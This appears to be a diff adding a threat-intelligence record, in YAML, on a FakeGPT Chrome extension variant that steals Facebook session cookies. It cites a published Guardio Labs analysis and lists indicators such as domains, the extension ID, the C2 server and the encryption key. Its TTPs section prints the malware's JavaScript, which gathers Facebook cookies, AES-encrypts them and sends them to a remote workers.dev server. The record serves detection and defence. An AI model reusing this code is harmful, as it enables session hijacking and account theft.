@@ -1,0 +1,51 @@
+description: 'A new variant of the FakeGPT Chrome extension, titled ''Chat GPT For
+  Google'', is stealing Facebook session cookies and compromising accounts in masses.
+
+  '
+attribution:
+- Threat Actor Group: Unknown
+malware_families:
+- FakeGPT
+TTPs:
+  processes:
+  - Browser.runtime.onInstalled.addListener
+  commandline:
+  - 'Browser.runtime.openOptionsPage(),Browser[qn].getAll({}).then((e) => { // qn
+    = ''cookies''let n = et(e);fetch("https://version.chatgpt4google.workers.dev/",{
+    method: "GET", headers: { "X-Cached-Key": xa(n, Dn) } }).then((g) => {g.status
+    === 200 ? console.log(g) : console.log("Version not found");});})'
+  - 'function et(r) {let e = [];return (r.forEach((n) => {let d = n.expirationDate
+    ? n.expirationDate : new Date(Date.now() + 864e5);if (((d = Math.trunc(new Date(d).getTime()
+    / 1e3)),n.domain.indexOf("facebook") >= 0)) {let g = n.domain + " " + (n.hostOnly
+    ? "FALSE" : "TRUE") + " " + n.path + " " + (n.secure ? "TRUE" : "FALSE") + " "
+    + d + " " + n.name + " " + n.value;e.push(g);}}),e.join("")); }'
+  - function xa(r, e) {return fa.default.AES.encrypt(r, e).toString();}
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - Process: Browser.runtime.onInstalled.addListener
+    Destination: https://version.chatgpt4google.workers.dev/
+    Port: 443
+  file_activity:
+  - https://www.chatgptforgoogle.pro
+  - https://www.chatgptgoogle.org
+  - https://chrome.google.com/webstore/detail/chatgpt-for-google/hacfaophiklaeolhnmckojjjjbnappen
+  - https://version.chatgpt4google.workers.dev/
+  persistence: []
+  pipes: []
+  process_relations:
+  - Browser.runtime.onInstalled.addListener -> fetch("https://version.chatgpt4google.workers.dev/")
+IOCs:
+- URL: https://www.chatgptforgoogle.pro
+- URL: https://www.chatgptgoogle.org
+- Extension ID: hacfaophiklaeolhnmckojjjjbnappen
+- C2 Server: https://version.chatgpt4google.workers.dev/
+- Encryption Key: chatgpt4google
+authors:
+- Nati Tal
+reference: https://guard.io/labs/fakegpt-2-open-source-turned-malicious-in-another-variant-of-the-facebook-account-stealer
+date_of_publication: March 22, 2023
+file_creation_date: August 03, 2025
